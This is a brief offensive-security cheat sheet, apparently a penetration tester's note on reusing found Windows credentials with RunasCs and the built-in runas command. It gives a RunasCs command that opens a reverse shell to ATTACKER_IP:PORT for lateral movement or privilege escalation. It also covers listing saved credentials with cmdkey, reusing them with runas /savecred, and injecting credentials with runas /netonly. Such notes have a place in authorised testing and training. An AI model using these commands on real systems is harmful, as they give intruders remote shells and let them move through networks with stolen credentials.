# Runas

## Use case: 

### Use this when we have found credentials for a user, but we have no other methods to authenticate (Win-RM, etc). Essentialy, we inject the credentials found in memory to authenticate with these valid credentials.

## Github repo: https://github.com/antonioCoco/RunasCs/releases/tag/v1.5

### Command:

    .\RunasCs.exe USERNAME PASSWORD cmd.exe ATTACKER_IP:PORT (Execute a reverse shell as the authenticated user for lateral movement/privesc)

## More Commands

#### 1) 

    cmdkey /list

#### 2) 

    runas /savecred /user:USER\DOMAIN cmd.exe

## Credential Injection

    runas.exe /netonly /user:DOMAIN\USERNAME cmd.exe


#### Use credentials we found in case that we don't know where to exactly use them.

### TIP:

#### With /netonly, it can accept any password.

